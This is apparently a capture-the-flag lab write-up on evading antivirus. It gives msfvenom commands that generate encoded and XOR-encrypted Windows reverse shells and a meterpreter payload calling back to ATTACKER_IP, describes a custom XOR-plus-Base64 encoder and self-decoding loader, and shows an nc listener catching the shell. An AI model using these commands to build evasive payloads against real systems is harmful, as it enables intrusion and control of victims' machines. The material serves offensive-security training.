# Task 8 Shellcode Encoding and Encryption

Task 8 Shellcode Encoding and Encryption

# Encode using MSFVenom

Public Tools such as Metasploit provide encoding and encryption features. However, AV vendors are aware of the way these tools build their payloads and take measures to detect them. If you try using such features out of the box, chances are your payload will be detected as soon as the file touches the victim's disk.

Let's generate a simple payload with this method to prove that point. First of all, you can list all of the encoders available to msfvenom with the following command:

Listing Encoders within theMetasploitFramework

```
user@AttackBox$ msfvenom --list encoders | grep excellent    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
```

```bash
msfvenom --list encoders | grep excellent
```

We can indicate we want to use the **`shikata_ga_nai`** encoder with the **`-e`**(encoder) switch and then specify we want to encode the payload three times with the **`-i`** (iterations) switch:

Encoding using the Metasploit framework (Shikata_ga_nai)

```
user@AttackBox$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharpFound 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai chosen with final size 422
Payload size: 422 bytes
Final size of csharp file: 2170 bytes
```

```bash
msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
```

If we try uploading our newly generated payload to our test machine, the AV will instantly flag it before we even get a chance to execute it:

<img src="images/t8_1.png">

If encoding doesn't work, we can always try encrypting the payload. Intuitively, we would expect this to have a higher success rating, as decrypting the payload should prove a harder task for the AV. Let's try that now.

# Encryption using MSFVenom

You can easily generate encrypted payloads using msfvenom. The choices for encryption algorithms are, however, a bit scarce. To list the available encryption algorithms, you can use the following command:

Listing encryption modules within theMetasploitFramework

```
user@AttackBox$ msfvenom --list encryptFramework Encryption Formats [--encrypt <value>]
================================================

    Name
    ----
    aes256
    base64
    rc4
    xor
```

```bash
msfvenom --list encrypt
```

Let's build an XOR-encrypted payload. For this type of algorithm, you will need to specify a key. The command would look as follows:

Xoring Shellcode using the Metasploit framework

```
user@AttackBox$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: xored-revshell.exe
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
```

Once again, if we upload the resulting shell to the THM Antivirus Check! page at **`http://10.10.189.219/`**, it will still be flagged by the AV. The reason is still that AV vendors have invested lots of time into ensuring simple msfvenom payloads are detected.

# Creating a Custom Payload

The best way to overcome this is to use our own custom encoding schemes so that the AV doesn't know what to do to analyze our payload. Notice you don't have to do anything too complex, as long as it is confusing enough for the AV to analyze. For this task, we will take a simple reverse shell generated by msfvenom and use a combination of XOR and Base64 to bypass Defender.

Let's start by generating a reverse shell with msfvenom in CSharp format:

Generate a CSharp shellcode Format

```
user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
```

```bash
msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
```

# The Encoder

Before building our actual payload, we will create a program that will take the shellcode generated by msfvenom and encode it in any way we like. In this case, we will be XORing the payload with a custom key first and then encoding it using base64. Here's the complete code for the encoder (you can also find this code in your Windows machine at C:\Tools\CS Files\Encryptor.cs):

[*Full Payload Code (Click to read)*](Task%208%20Shellcode%20Encoding%20and%20Encryption%20644f125c98ce41c9ad3a1a295c03edc5/Encoder%20f7b993c1ebbb4cba843f68382d34bbff.md) 

[link to encoder](Task%208%20Shellcode%20Encoding%20and%20Encryption%20644f125c98ce41c9ad3a1a295c03edc5/Encoder%20f7b993c1ebbb4cba843f68382d34bbff.md)

The code is pretty straightforward and will generate an encoded payload that we will embed on the final payload. Remember to replace the **`buf`** variable with the shellcode you generated with msfvenom.

To compile and execute the encoder, we can use the following commands on the Windows machine:

Compiling and running our custom CSharp encoder

```
C:\> csc.exe Encrypter.cs
C:\> .\Encrypter.exe
qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=
```

```bash
csc.exe Encrypter.cs
```

```bash
.\Encrypter.exe
```

# Self-decoding Payload

Since we have an encoded payload, we need to adjust our code so that it decodes the shellcode before executing it. To match the encoder, we will decode everything in the reverse order we encoded it, so we start by decoding the base64 content and then continue by XORing the result with the same key we used in the encoder. Here's the full payload code (you can also get it in your Windows machine at **`C:\Tools\CS Files\EncStageless.cs`**):

[*Full Payload Code (Click to read)*](Task%208%20Shellcode%20Encoding%20and%20Encryption%20644f125c98ce41c9ad3a1a295c03edc5/Enc%20Stageless%20cs%20708230a1f2424e068fa158c44c73b5db.md)

Note that we have merely combined a couple of really simple techniques that were detected when used separately. Still, the AV won't complain about the payload this time, as the combination of both methods is not something it can analyze directly.

Let's compile our payload with the following command on the Windows machine:

Compile Our Encrypted Payload

```
C:\> csc.exe EncStageless.cs
```

Before running our payload, let's set up an **`nc`** listener. After copying and executing our payload into the victim machine, we should get a connection back as expected:

Set Up nc Listener

```
user@AttackBox$ nc -lvp 443Listening on [0.0.0.0] (family 0, port 443)
Connection from ip-10-10-139-83.eu-west-1.compute.internal 49817 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32>
```

As you can see, simple adjustments are enough sometimes. Most of the time, any specific methods you find online won't probably work out of the box as detection signatures may already exist for them. However, using a bit of imagination to customize any method could prove enough for a successful bypass.

Answer the questions below:

Try to use this technique (combining encoding and encryption) on the THM Antivirus Check at **`http://10.10.189.219/`**. Does it bypass the installed AV software?

yes/NAN

[Encoder](Task%208%20Shellcode%20Encoding%20and%20Encryption%20644f125c98ce41c9ad3a1a295c03edc5/Encoder%20f7b993c1ebbb4cba843f68382d34bbff.md)

[Enc Stageless.cs](Task%208%20Shellcode%20Encoding%20and%20Encryption%20644f125c98ce41c9ad3a1a295c03edc5/Enc%20Stageless%20cs%20708230a1f2424e068fa158c44c73b5db.md)
